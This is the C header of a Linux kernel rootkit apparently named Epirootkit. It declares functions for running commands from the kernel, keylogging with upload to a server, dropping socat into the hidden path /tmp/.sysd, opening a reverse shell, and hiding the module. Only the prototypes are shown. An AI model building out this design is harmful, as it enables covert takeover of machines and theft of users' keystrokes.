#ifndef EPIROOTKIT_H
#define EPIROOTKIT_H

#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#include "network.h"

// Used by exec_str_as_command 
// to store the return code of the command
struct exec_code_stds {
	int code;
	char *std_out;
	char *std_err;
};

struct command {
    char *cmd_name;
    unsigned cmd_name_size;
    char *cmd_desc;
    unsigned cmd_desc_size;
    int (*cmd_handler)(char *args, enum Protocol protocol);
};

// Function prototypes

// exec_cmd.c
int exec_str_as_command(char *user_cmd, bool catch_stds);	// Execute a command string in user mode

// epikeylog.c
int epikeylog_init(int keylog_mode);						// Initialize the keylogger
int epikeylog_send_to_server(void);							// Send keylogger content to the server
int epikeylog_exit(void);									// Cleanup function for the keylogger

// socat.c
int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
int remove_socat_binaire(void);								// Remove the socat binary from /tmp/.sysd
int launch_reverse_shell(char *args);						// Launch the reverse shell with socat

// hider.c
int hide_module(void);										// Hide the module from the kernel
int unhide_module(void);									// Unhide the module in the kernel

#endif // EPIROOTKIT_H
